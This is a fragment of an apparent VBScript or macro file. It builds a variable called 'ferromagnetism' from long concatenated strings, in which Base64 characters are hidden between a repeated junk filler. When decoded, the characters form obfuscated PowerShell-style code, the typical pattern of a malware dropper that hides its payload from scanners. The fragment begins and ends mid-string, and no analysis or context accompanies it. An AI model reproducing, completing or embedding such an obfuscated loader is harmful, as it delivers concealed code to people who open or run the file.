zbaqJmgkitbaktkqzbaqGmgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqYmgkitbaktkqzbaqXmgkitbaktkqzbaqpmgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqnmgkitbaktkqzbaqJmgkitbaktkqzbaq5mgkitbaktkqzbaqWmgkitbaktkqzbaqymgkitbaktkqzbaqRmgkitbaktkqzbaqimgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqzmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaqymgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqnmgkitbaktkqzbaqKmgkitbaktkqzbaqymgkitbaktkqzbaqRmgkitbaktkqzbaqtmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqpmgkitbaktkqzbaqYmgkitbaktkqzbaqmmgkitbaktkqzbaq9mgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaqFmgkitbaktkqzbaq0mgkitbaktkqzbaqgmgkitbaktkqzbaqLmgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqlmgkitbaktkqzbaqImgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaqzmgkitbaktkqzbaqcmgkitbaktkqzbaqHmgkitbaktkqzbaqJmgkitbaktkqzbaqhmgkitbaktkqzbaqdmgkitbaktkqzbaq2mgkitbaktkqzbaqxmgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqdmgkitbaktkqzbaqsmgkitbaktkqzbaqemgkitbaktkqzbaqVmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqbmgkitbaktkqzbaqWmgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqJmgkitbaktkqzbaqvmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqRmgkitbaktkqzbaqdmgkitbaktkqzbaqKmgkitbaktkqzbaqXmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqcmgkitbaktkqzbaqGmgkitbaktkqzbaq9mgkitbaktkqzbaqsmgkitbaktkqzbaqemgkitbaktkqzbaqWmgkitbaktkqzbaqhmgkitbaktkqzbaqlmgkitbaktkqzbaqZmgkitbaktkqzbaqHmgkitbaktkqzbaqJmgkitbaktkqzbaqpmgkitbaktkqzbaqYmgkitbaktkqzbaqzmgkitbaktkqzbaq0mgkitbaktkqzbaqkmgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaqJmgkitbaktkqzbaqpmgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqRmgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqUmgkitbaktkqzbaq7mgkitbaktkqzbaqYmgkitbaktkqzbaqnmgkitbaktkqzbaqJmgkitbaktkqzbaqlmgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaqtmgkitbaktkqzbaq9mgkitbaktkqzbaqfmgkitbaktkqzbaqWmgkitbaktkqzbaqlmgkitbaktkqzbaqmmgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaqwmgkitbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaqxmgkitbaktkqzbaq5mgkitbaktkqzbaqamgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaqkmgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqlmgkitbaktkqzbaqjmgkitbaktkqzbaqKmgkitbaktkqzbaqXmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqTmgkitbaktkqzbaqmmgkitbaktkqzbaqlmgkitbaktkqzbaqrmgkitbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaqxmgkitbaktkqzbaqhmgkitbaktkqzbaqemgkitbaktkqzbaqWmgkitbaktkqzbaqVmgkitbaktkqzbaq2mgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqNmgkitbaktkqzbaqomgkitbaktkqzbaqPmgkitbaktkqzbaqSmgkitbaktkqzbaqRmgkitbaktkqzbaqimgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqzmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaqymgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqnmgkitbaktkqzbaqOmgkitbaktkqzbaq2mgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaqFmgkitbaktkqzbaqrmgkitbaktkqzbaqfmgkitbaktkqzbaqXmgkitbaktkqzbaq1mgkitbaktkqzbaqpmgkitbaktkqzbaqZmgkitbaktkqzbaqimgkitbaktkqzbaqgmgkitbaktkqzbaqkmgkitbaktkqzbaqTmgkitbaktkqzbaqmmgkitbaktkqzbaqlmgkitbaktkqzbaqrmgkitbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaqxmgkitbaktkqzbaqhmgkitbaktkqzbaqemgkitbaktkqzbaqWmgkitbaktkqzbaqVmgkitbaktkqzbaq2mgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqNmgkitbaktkqzbaqomgkitbaktkqzbaqImgkitbaktkqzbaqCmgkitbaktkqzbaq1mgkitbaktkqzbaqlmgkitbaktkqzbaqcmgkitbaktkqzbaqSmgkitbaktkqzbaqAmgkitbaktkqzbaqtmgkitbaktkqzbaqMmgkitbaktkqzbaqSmgkitbaktkqzbaqlmgkitbaktkqzbaq7mgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaq0mgkitbaktkqzbaqdmgkitbaktkqzbaqXmgkitbaktkqzbaqJm"
ferromagnetism = ferromagnetism & "gkitbaktkqzbaqumgkitbaktkqzbaqfmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaqsmgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqzmgkitbaktkqzbaqamgkitbaktkqzbaqGmgkitbaktkqzbaq5mgkitbaktkqzbaqlmgkitbaktkqzbaqcmgkitbaktkqzbaq3mgkitbaktkqzbaqMmgkitbaktkqzbaq9mgkitbaktkqzbaqJmgkitbaktkqzbaqGmgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqYmgkitbaktkqzbaqXmgkitbaktkqzbaqpmgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqnmgkitbaktkqzbaqJmgkitbaktkqzbaq5mgkitbaktkqzbaqWmgkitbaktkqzbaqymgkitbaktkqzbaqRmgkitbaktkqzbaqOmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqtmgkitbaktkqzbaqvmgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqFmgkitbaktkqzbaq5mgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqZmgkitbaktkqzbaqpmgkitbaktkqzbaqYmgkitbaktkqzbaq2mgkitbaktkqzbaqgmgkitbaktkqzbaqumgkitbaktkqzbaqLmgkitbaktkqzbaqimgkitbaktkqzbaqgmgkitbaktkqzbaqkmgkitbaktkqzbaqYmgkitbaktkqzbaqnmgkitbaktkqzbaqJmgkitbaktkqzbaqhmgkitbaktkqzbaqemgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaqumgkitbaktkqzbaqcmgkitbaktkqzbaqnmgkitbaktkqzbaqkmgkitbaktkqzbaqumgkitbaktkqzbaqTmgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaq3mgkitbaktkqzbaqRmgkitbaktkqzbaqomgkitbaktkqzbaqLmgkitbaktkqzbaqTmgkitbaktkqzbaqEmgkitbaktkqzbaqpmgkitbaktkqzbaqXmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaq2mgkitbaktkqzbaqlmgkitbaktkqzbaqkmgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqtmgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaqjmgkitbaktkqzbaq1mgkitbaktkqzbaqOmgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqcmgkitbaktkqzbaqtmgkitbaktkqzbaqTmgkitbaktkqzbaq2mgkitbaktkqzbaqJmgkitbaktkqzbaqqmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaqNmgkitbaktkqzbaq0mgkitbaktkqzbaqImgkitbaktkqzbaqEmgkitbaktkqzbaqlmgkitbaktkqzbaqPmgkitbaktkqzbaqLmgkitbaktkqzbaqkmgkitbaktkqzbaq1mgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqWmgkitbaktkqzbaq9mgkitbaktkqzbaqymgkitbaktkqzbaqemgkitbaktkqzbaqVmgkitbaktkqzbaqNmgkitbaktkqzbaq0mgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaqhmgkitbaktkqzbaqbmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaq2mgkitbaktkqzbaqlmgkitbaktkqzbaqkmgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqtmgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaqimgkitbaktkqzbaq5mgkitbaktkqzbaqXmgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqlmgkitbaktkqzbaq0mgkitbaktkqzbaqZmgkitbaktkqzbaqSmgkitbaktkqzbaqgmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaqsmgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqzmgkitbaktkqzbaqamgkitbaktkqzbaqGmgkitbaktkqzbaq5mgkitbaktkqzbaqlmgkitbaktkqzbaqcmgkitbaktkqzbaq3mgkitbaktkqzbaqMmgkitbaktkqzbaqsmgkitbaktkqzbaqMmgkitbaktkqzbaqCmgkitbaktkqzbaqwmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaqsmgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqzmgkitbaktkqzbaqamgkitbaktkqzbaqGmgkitbaktkqzbaq5mgkitbaktkqzbaqlmgkitbaktkqzbaqcmgkitbaktkqzbaq3mgkitbaktkqzbaqMmgkitbaktkqzbaqumgkitbaktkqzbaqTmgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaq3mgkitbaktkqzbaqRmgkitbaktkqzbaqomgkitbaktkqzbaqKmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaq2mgkitbaktkqzbaqlmgkitbaktkqzbaqkmgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqtmgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaqimgkitbaktkqzbaq5mgkitbaktkqzbaqTmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaqVmgkitbaktkqzbaqrmgkitbaktkqzbaqKmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqJmgkitbaktkqzbaq0mgkitbaktkqzbaqJmgkitbaktkqzbaqlmgkitbaktkqzbaqZmgkitbaktkqzbaq2mgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqlmgkitbaktkqzbaq8mgkitbaktkqzbaqTmgkitbaktkqzbaq3mgkitbaktkqzbaqVmgkitbaktkqzbaq0mgkitbaktkqzbaqLmgkitbaktkqzbaqUmgkitbaktkqzbaq5mgkitbaktkqzbaq1mgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqwmgkitbaktkqzbaq7mgkitbaktkqzbaqJmgkitbaktkqzbaqGmgkitbaktkqzbaqJmgkitbaktkqzbaqhmgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqVmgkitbaktkqzbaqtmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaq0mgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqrmgkitbaktkqzbaqZmgkitbaktkqzbaqTmgkitbaktkqzbaq1mgkitbaktkqzbaqbmgkitbaktkqzbaqRmgkitbaktkqzbaqHmgkitbaktkqzbaqJmgkitbaktkqzbaqhmgkitbaktkqzbaqdmgkitbaktkqzbaq2mgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaqymgkitbaktkqzbaq5mgkitbaktkqzbaqCmgkitbaktkqzbaqamgkitbaktkqzbaqXmgkitbaktkqzbaqRmgkitbaktkqzbaqtmgkitbaktkqzbaqYmgkitbaktkqzbaqXmgkitbaktkqzbaqBmgkitbaktkqzbaqdmgkitbaktkqzbaqOmgkitbaktkqzbaqjmgkitbaktkqzbaqpmgkitbaktkqzbaqGmgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaq9mgkitbaktkqzbaqtmgkitbaktkqzbaqUmgkitbaktkqzbaq3mgkitbaktkqzbaqRmgkitbaktkqzbaqymgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaqFmgkitbaktkqzbaqtmgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaqrmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqRmgkitbaktkqzbaqzmgkitbaktkqzbaqamgkitbaktkqzbaq2mgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqKmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqZmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqhmgkitbaktkqzbaqcmgkitbaktkqzbaq3mgkitbaktkqzbaqBmgkitbaktkqzbaqpmgkitbaktkqzbaqZmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqkmgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaqUmgkitbaktkqzbaq9mgkitbaktkqzbaqTmgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaq3mgkitbaktkqzbaqLmgkitbaktkqzbaqUmgkitbaktkqzbaq9mgkitbaktkqzbaqimgkitbaktkqzbaqamgkitbaktkqzbaqmmgkitbaktkq"
ferromagnetism = ferromagnetism & "zbaqVmgkitbaktkqzbaqjmgkitbaktkqzbaqdmgkitbaktkqzbaqCmgkitbaktkqzbaqBmgkitbaktkqzbaqDmgkitbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaqxmgkitbaktkqzbaqsmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaqNmgkitbaktkqzbaq0mgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq9mgkitbaktkqzbaqumgkitbaktkqzbaqcmgkitbaktkqzbaqymgkitbaktkqzbaq5mgkitbaktkqzbaqHmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqlmgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqlmgkitbaktkqzbaqjmgkitbaktkqzbaqLmgkitbaktkqzbaqkmgkitbaktkqzbaqxmgkitbaktkqzbaqpmgkitbaktkqzbaqcmgkitbaktkqzbaq3mgkitbaktkqzbaqRmgkitbaktkqzbaqbmgkitbaktkqzbaqQmgkitbaktkqzbaqnmgkitbaktkqzbaqlmgkitbaktkqzbaq0mgkitbaktkqzbaqZmgkitbaktkqzbaqVmgkitbaktkqzbaq0mgkitbaktkqzbaq7mgkitbaktkqzbaqZmgkitbaktkqzbaqmmgkitbaktkqzbaq9mgkitbaktkqzbaqymgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaqwmgkitbaktkqzbaqdmgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqjmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqsmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq9mgkitbaktkqzbaq1mgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqxmgkitbaktkqzbaq5mgkitbaktkqzbaqPmgkitbaktkqzbaqTmgkitbaktkqzbaqAmgkitbaktkqzbaq7mgkitbaktkqzbaqJmgkitbaktkqzbaqHmgkitbaktkqzbaqBmgkitbaktkqzbaq1mgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqNmgkitbaktkqzbaq0mgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqxmgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaq3mgkitbaktkqzbaqVmgkitbaktkqzbaqzmgkitbaktkqzbaqbmgkitbaktkqzbaqHmgkitbaktkqzbaqkmgkitbaktkqzbaqgmgkitbaktkqzbaqLmgkitbaktkqzbaqWmgkitbaktkqzbaqxmgkitbaktkqzbaq0mgkitbaktkqzbaqImgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaqimgkitbaktkqzbaqYmgkitbaktkqzbaqXmgkitbaktkqzbaqNmgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqWmgkitbaktkqzbaqVmgkitbaktkqzbaqumgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaqxmgkitbaktkqzbaqpmgkitbaktkqzbaqamgkitbaktkqzbaq2mgkitbaktkqzbaqUmgkitbaktkqzbaqumgkitbaktkqzbaqSmgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaqpmgkitbaktkqzbaqZmgkitbaktkqzbaq2mgkitbaktkqzbaqhmgkitbaktkqzbaq0mgkitbaktkqzbaqOmgkitbaktkqzbaqymgkitbaktkqzbaqRmgkitbaktkqzbaqwmgkitbaktkqzbaqdmgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqjmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqsmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq9mgkitbaktkqzbaq1mgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqxmgkitbaktkqzbaq5mgkitbaktkqzbaqKmgkitbaktkqzbaqymgkitbaktkqzbaqsmgkitbaktkqzbaqpmgkitbaktkqzbaqemgkitbaktkqzbaq2mgkitbaktkqzbaqZmgkitbaktkqzbaqvmgkitbaktkqzbaqcmgkitbaktkqzbaqimgkitbaktkqzbaqgmgkitbaktkqzbaqkmgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaqqmgkitbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaqHmgkitbaktkqzbaqVmgkitbaktkqzbaqymgkitbaktkqzbaqZmgkitbaktkqzbaqTmgkitbaktkqzbaq0mgkitbaktkqzbaqwmgkitbaktkqzbaqOmgkitbaktkqzbaqymgkitbaktkqzbaqRmgkitbaktkqzbaqymgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaqpmgkitbaktkqzbaqvmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqkmgkitbaktkqzbaqdmgkitbaktkqzbaqXmgkitbaktkqzbaqJmgkitbaktkqzbaqlmgkitbaktkqzbaqImgkitbaktkqzbaqCmgkitbaktkqzbaq1mgkitbaktkqzbaqsmgkitbaktkqzbaqdmgkitbaktkqzbaqCmgkitbaktkqzbaqAmgkitbaktkqzbaqkmgkitbaktkqzbaqYmgkitbaktkqzbaqmmgkitbaktkqzbaqFmgkitbaktkqzbaqzmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq1mgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqnmgkitbaktkqzbaqRmgkitbaktkqzbaqsmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqtmgkitbaktkqzbaqlmgkitbaktkqzbaqLmgkitbaktkqzbaqlmgkitbaktkqzbaqdmgkitbaktkqzbaqpmgkitbaktkqzbaqZmgkitbaktkqzbaqHmgkitbaktkqzbaqRmgkitbaktkqzbaqomgkitbaktkqzbaqOmgkitbaktkqzbaqymgkitbaktkqzbaqRmgkitbaktkqzbaqymgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaqpmgkitbaktkqzbaqvmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqkmgkitbaktkqzbaqdmgkitbaktkqzbaqXmgkitbaktkqzbaqJmgkitbaktkqzbaqlmgkitbaktkqzbaqKmgkitbaktkqzbaqymgkitbaktkqzbaqsmgkitbaktkqzbaqpmgkitbaktkqzbaqemgkitbaktkqzbaqymgkitbaktkqzbaqRmgkitbaktkqzbaq0mgkitbaktkqzbaqcmgkitbaktkqzbaqnmgkitbaktkqzbaqVmgkitbaktkqzbaqumgkitbaktkqzbaqYmgkitbaktkqzbaq2mgkitbaktkqzbaqFmgkitbaktkqzbaq0mgkitbaktkqzbaqbmgkitbaktkqzbaq3mgkitbaktkqzbaqNmgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaqnmgkitbaktkqzbaqVmgkitbaktkqzbaqhmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaqUmgkitbaktkqzbaq9mgkitbaktkqzbaqJmgkitbaktkqzbaqGmgkitbaktkqzbaqJmgkitbaktkqzbaqhmgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqVmgkitbaktkqzbaqtmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaq0mgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqrmgkitbaktkqzbaqZmgkitbaktkqzbaqSmgkitbaktkqzbaq5mgkitbaktkqzbaqHmgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqRmgkitbaktkqzbaqQmgkitbaktkqzbaqamgkitbaktkqzbaqXmgkitbaktkqzbaqhmgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqCmgkitbaktkqzbaqgmgkitbaktkqzbaqkmgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaqqmgkitbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaqHmgkitbaktkqzbaqVmgkitbaktkqzbaqymgkitbaktkqzbaqZmgkitbaktkqzbaqSmgkitbaktkqzbaqwmgkitbaktkqzbaqkmgkitbaktkqzbaqcmgkitbaktkqzbaqHmgkitbaktkqzbaqVmgkitbaktkqzbaqumgkitbaktkqzbaqYmgkitbaktkqzbaq3mgkitbaktkqzbaqRmgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqvmgkitbaktkqzbaqdmgkitbaktkqzbaqXmgkitbaktkqzbaqNmgkitbaktkqzbaqsmgkitbaktkqzbaqemgkitbaktkqzbaqSmgkitbaktkqzbaqkmgkitbaktkqzbaq7mgkitbaktkqzbaqJmgkitbaktkqzbaqGmgkitbaktkqzbaqRmgkitbaktkqzbaqpmgkitbaktkqzbaqYmgkitbaktkqzbaqXmgkitbaktkqzbaqNmgkitbaktkqzbaqwmgkitbaktkqzbaqamgkitbaktkqzbaqWmgki"
ferromagnetism = ferromagnetism & "tbaktkqzbaqRmgkitbaktkqzbaqpmgkitbaktkqzbaqZmgkitbaktkqzbaqGmgkitbaktkqzbaqFmgkitbaktkqzbaqlmgkitbaktkqzbaqLmgkitbaktkqzbaqkmgkitbaktkqzbaqFmgkitbaktkqzbaqkmgkitbaktkqzbaqZmgkitbaktkqzbaqCmgkitbaktkqzbaqgmgkitbaktkqzbaqkmgkitbaktkqzbaqdmgkitbaktkqzbaqHmgkitbaktkqzbaqJmgkitbaktkqzbaq1mgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqNmgkitbaktkqzbaqhmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaq9mgkitbaktkqzbaqzmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaq1mgkitbaktkqzbaqYmgkitbaktkqzbaqXmgkitbaktkqzbaqRmgkitbaktkqzbaqlmgkitbaktkqzbaqLmgkitbaktkqzbaqlmgkitbaktkqzbaqImgkitbaktkqzbaqpmgkitbaktkqzbaqOmgkitbaktkqzbaqymgkitbaktkqzbaqRmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqFmgkitbaktkqzbaqzmgkitbaktkqzbaqcmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqRmgkitbaktkqzbaqhmgkitbaktkqzbaqZmgkitbaktkqzbaqSmgkitbaktkqzbaq5mgkitbaktkqzbaqBmgkitbaktkqzbaqZmgkitbaktkqzbaqGmgkitbaktkqzbaqQmgkitbaktkqzbaqomgkitbaktkqzbaqJmgkitbaktkqzbaqHmgkitbaktkqzbaqRmgkitbaktkqzbaqymgkitbaktkqzbaqdmgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqjmgkitbaktkqzbaqYmgkitbaktkqzbaqXmgkitbaktkqzbaqRmgkitbaktkqzbaqvmgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqdmgkitbaktkqzbaqWmgkitbaktkqzbaqFmgkitbaktkqzbaq0mgkitbaktkqzbaqZmgkitbaktkqzbaqSmgkitbaktkqzbaq5mgkitbaktkqzbaqHmgkitbaktkqzbaqKmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqZmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqhmgkitbaktkqzbaqcmgkitbaktkqzbaq3mgkitbaktkqzbaqBmgkitbaktkqzbaqpmgkitbaktkqzbaqZmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqkmgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaqUmgkitbaktkqzbaqumgkitbaktkqzbaqQmgkitbaktkqzbaqWmgkitbaktkqzbaqRmgkitbaktkqzbaqkmgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaq0mgkitbaktkqzbaqcmgkitbaktkqzbaqnmgkitbaktkqzbaqVmgkitbaktkqzbaqumgkitbaktkqzbaqYmgkitbaktkqzbaq2mgkitbaktkqzbaqFmgkitbaktkqzbaq0mgkitbaktkqzbaqbmgkitbaktkqzbaq3mgkitbaktkqzbaqNmgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaqnmgkitbaktkqzbaqVmgkitbaktkqzbaqhmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaqUmgkitbaktkqzbaqumgkitbaktkqzbaqQmgkitbaktkqzbaqimgkitbaktkqzbaqlmgkitbaktkqzbaq9mgkitbaktkqzbaqfmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqbmgkitbaktkqzbaqWmgkitbaktkqzbaqlmgkitbaktkqzbaqzmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq1mgkitbaktkqzbaqwmgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaq9mgkitbaktkqzbaq5mgkitbaktkqzbaqPmgkitbaktkqzbaqVmgkitbaktkqzbaqtmgkitbaktkqzbaqCmgkitbaktkqzbaqamgkitbaktkqzbaqXmgkitbaktkqzbaqRmgkitbaktkqzbaqDmgk